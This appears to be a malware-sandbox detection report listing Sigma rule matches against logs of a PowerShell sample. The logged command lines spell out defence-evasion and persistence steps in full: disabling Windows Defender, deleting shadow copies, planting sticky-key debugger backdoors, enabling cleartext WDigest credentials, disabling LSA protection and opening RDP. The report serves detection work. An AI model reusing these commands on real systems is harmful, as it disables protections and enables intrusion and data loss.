attributes.magic: ASCII text, with CRLF line terminators

sigma_analysis_results.rule_title: Sticky Key Like Backdoor Usage - Registry
sigma_analysis_results.rule_description: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community

match_context.values: @{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe\Debugger}
@{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\Debugger}
@{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe\Debugger}
@{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger}

@{EventType=SetValue; Details=%%windir%%\system32\cmd.exe; Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe\Debugger}

sigma_analysis_results.rule_description: Detects execution of "reg.exe" to disable security services such as Windows Defender.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), John Lambert (idea), elhoim

match_context.values: @{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" add HKLM\SYSTEM\CurrentControlSet\services\WinDefend /v Start /t REG_DWORD /d 4 /f; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware

match_context.values: @{Hashes=SHA1=130DADD41BE6AC88692FEFA704F86B695A776250,MD5=98CC37BBF363A38834253E22C80A8F32,SHA256=D6072E8809E95B8297FBDC431FFDA58A04B845664145A8443318FC4FC2EAB573,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=netsh.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Network Command Shell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\netsh.exe" advfirewall firewall add rule "name=allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\netsh.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Disable Windows Defender Functionalities Via Registry Keys
sigma_analysis_results.rule_description: Detects when attackers or tools disable Windows Defender functionalities via the Windows registry
sigma_analysis_results.rule_author: AlertIQ, Ján Trencanský, frack113, Nasreddine Bencherchali, Swachchhanda Shrawan Poudel

match_context.values: @{EventID=13; Details=DWORD (0x00000000); Image=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2102.4-0\MsMpEng.exe; EventType=SetValue; TargetObject=HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet\SpyNetReporting}
@{EventID=13; Details=DWORD (0x00000001); Image=C:\Windows\system32\reg.exe; EventType=SetValue; TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware}

@{EventID=13; EventType=SetValue; Image=C:\Windows\system32\reg.exe; Details=DWORD (0x00000001); TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection}

@{EventID=13; Details=DWORD (0x00000001); Image=C:\Windows\system32\reg.exe; EventType=SetValue; TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring}
@{EventType=SetValue; Details=DWORD (0x00000001); Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet\DisableBlockAtFirstSeen}

sigma_analysis_results.rule_description: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 0x1 /f; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0x1 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 0x1 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0x0 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0x2 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to enable clear-text credentials

match_context.values: @{Details=DWORD (0x00000001); EventType=SetValue; Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential}

sigma_analysis_results.rule_description: Detects when an attacker or tool disables the  Windows Defender service (WinDefend) via the registry
sigma_analysis_results.rule_author: Ján Trencanský, frack113, AlertIQ, Nasreddine Bencherchali

match_context.values: @{Details=DWORD (0x00000004); EventID=13; Image=C:\Windows\system32\reg.exe; EventType=SetValue; TargetObject=HKLM\System\CurrentControlSet\Services\WinDefend\Start}

sigma_analysis_results.rule_title: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE
sigma_analysis_results.rule_description: Detects the usage of "reg.exe" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0x0 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0x2 /f; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: LSA PPL Protection Disabled Via Reg.EXE
sigma_analysis_results.rule_description: Detects the usage of the "reg.exe" utility to disable PPL protection on the LSA process

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious Volume Shadow Copy VSS_PS.dll Load
sigma_analysis_results.rule_description: Detects the image load of vss_ps.dll by uncommon executables

match_context.values: @{Hashes=SHA1=104B8788B32D58AFBC8DA6FBFE4BEE46E0529165,MD5=8DF1F5B7ABA8E4DAD54F514F1A1846D5,SHA256=08400092E20D62B26DA59FED64AA4BEB2ED77794A5544E75236B053569B965DF,IMPHASH=C5B469536773ACBE4A39A962769B5BF4; Product=Microsoft\xae Windows\xae Operating System; OriginalFileName=VSS_PS.DLL; ImageLoaded=C:\Windows\System32\vss_ps.dll; Description=Microsoft\xae Volume Shadow Copy Service proxy/stub; SignatureStatus=Valid; EventID=7; FileVersion=10.0.17134.1 (WinBuild.160101.0800); Signature=Microsoft Windows; Signed=true; Image=C:\Windows\System32\vssadmin.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Shadow Copies Deletion Using Operating Systems Utilities
sigma_analysis_results.rule_description: Shadow Copies deletion using operating systems utilities
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=VSSADMIN.EXE; Hashes=SHA1=B09B5638BCE6904D2D84854A0371959247E7729A,MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE; Description=Command Line Interface for Microsoft\xae Volume Shadow Copy Service ; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\vssadmin.exe" Delete Shadows /All /Quiet; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\vssadmin.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=B09B5638BCE6904D2D84854A0371959247E7729A,MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=VSSADMIN.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Command Line Interface for Microsoft\xae Volume Shadow Copy Service ; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\vssadmin.exe" delete shadows /all; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\vssadmin.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=VSSADMIN.EXE; Hashes=MD5=B58073DB8892B67A672906C9358020EC,SHA256=8C1FABCC2196E4D096B7D155837C5F699AD7F55EDBF84571E4F8E03500B7A8B0,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE; Description=Command Line Interface for Microsoft\xae Volume Shadow Copy Service ; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy bypass -File "C:\Users\Bruno\Desktop\script.ps1"; CommandLine="C:\Windows\system32\vssadmin.exe" Delete Shadows /All /Quiet; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\vssadmin.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro

match_context.values: @{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe" /f /v Debugger /t REG_SZ /d %%windir%%\system32\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f /v Debugger /t REG_SZ /d %%windir%%\system32\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe" /f /v Debugger /t REG_SZ /d %%windir%%\system32\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f /v Debugger /t REG_SZ /d %%windir%%\system32\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects PowerShell scripts attempting to disable scheduled scanning and other parts of Windows Defender ATP or set default actions to allow.
sigma_analysis_results.rule_author: frack113, elhoim, Tim Shelton (fps, alias support), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)

match_context.values:
@{ScriptBlockText=vssadmin.exe Delete Shadows /All /Quiet


powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-MpPreference -MAPSReporting 0
powershell Set-MpPreference -SubmitSamplesConsent 2
taskkill /F /IM MSASCuiL.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Micro [TRUNCATED]; Path=C:\Users\george\Desktop\sample.ps1; ScriptBlockId=aa075e78-c3d9-4c2c-b433-3992f6297157; MessageTotal=1; MessageNumber=1; EventID=4104}
@{ScriptBlockText=Set-MpPreference -MAPSReporting 0; MessageTotal=1; ScriptBlockId=70f9d2c5-1146-4361-8902-3cb7e101efaa; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=vssadmin.exe Delete Shadows /All /Quiet


powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-MpPreference -MAPSReporting 0
powershell Set-MpPreference -SubmitSamplesConsent 2
taskkill /F /IM MSASCuiL.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Micro [TRUNCATED]; MessageTotal=1; ScriptBlockId=6ff7b0b7-6054-42ce-acd5-ef188850d799; Path=C:\Users\Bruno\AppData\Local\Temp\sample.ps1; EventID=4104; MessageNumber=1}
@{ScriptBlockText=Set-MpPreference -MAPSReporting 0; MessageTotal=1; ScriptBlockId=3268b182-9f9e-4bf8-b082-d4946e5b7414; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=vssadmin.exe Delete Shadows /All /Quiet


powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-MpPreference -MAPSReporting 0
powershell Set-MpPreference -SubmitSamplesConsent 2
taskkill /F /IM MSASCuiL.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Micro [TRUNCATED]; Path=C:\Users\Bruno\Desktop\script.ps1; ScriptBlockId=7b151e94-10f0-475d-b7ca-500bd148b2de; MessageTotal=1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.

match_context.values: @{EventID=1; Image=C:\Windows\system32\svchost.exe; CommandLine=%WINDIR%\system32\svchost.exe}

sigma_analysis_results.rule_title: Potential Tampering With RDP Related Registry Keys Via Reg.EXE
sigma_analysis_results.rule_description: Detects the execution of "reg.exe" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\Control\Terminal Server' values

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v SecurityLayer /t REG_DWORD /d 00000001; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=reg.exe; Hashes=SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; Description=Registry Console Tool; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0 /f; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Detects tampering of RDP Terminal Service/Server sensitive settings.
Such as allowing unauthorized users access to a system via the 'fAllowUnsolicited' or enabling RDP via 'fDenyTSConnections'...etc
